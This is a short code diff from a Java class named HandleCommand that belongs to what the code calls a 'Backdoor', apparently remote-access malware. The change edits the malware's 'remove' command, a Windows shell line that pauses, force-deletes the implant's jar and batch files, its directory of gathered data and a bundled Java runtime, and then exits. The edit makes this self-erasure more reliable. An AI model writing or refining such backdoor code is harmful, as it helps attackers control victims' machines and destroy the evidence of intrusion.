@@ -229,7 +229,7 @@ public class HandleCommand {
 			}
 		else if (command.equals("remove"))
 			try {
-				Runtime.getRuntime().exec("cmd /c ping localhost -n 5 > nul && del /f /q run.jar run.bat && rd /s /q "
+				Runtime.getRuntime().exec("cmd /c ping localhost -n 5 > nul && cd "+System.getProperty("user.dir")+" && del /f /q run.jar run.bat && rd /s /q "
 						+ Backdoor.gatheredDir + " jre");
 				System.exit(0);
 			} catch (Exception e) {
